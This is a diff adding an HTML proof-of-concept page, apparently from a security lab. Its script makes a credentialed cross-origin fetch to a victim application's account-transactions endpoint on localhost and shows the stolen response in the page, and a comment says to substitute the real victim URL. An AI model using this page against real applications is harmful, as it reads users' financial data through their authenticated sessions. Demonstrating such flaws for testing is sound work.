@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Account Information Data Breach</title>
+</head>
+<body>
+<h1>Attacked Data</h1>
+<div id="data"></div>
+<script>
+    fetch('http://localhost:8080/accounts/0/transactions', {
+        credentials: 'include'
+    }) // Use the actual URL of the victim application
+        .then(response => response.text())
+        .then(data => {
+            document.getElementById('data').innerHTML = data;
+        })
+        .catch(error => console.error('Error:', error));
+</script>
+</body>
+</html>
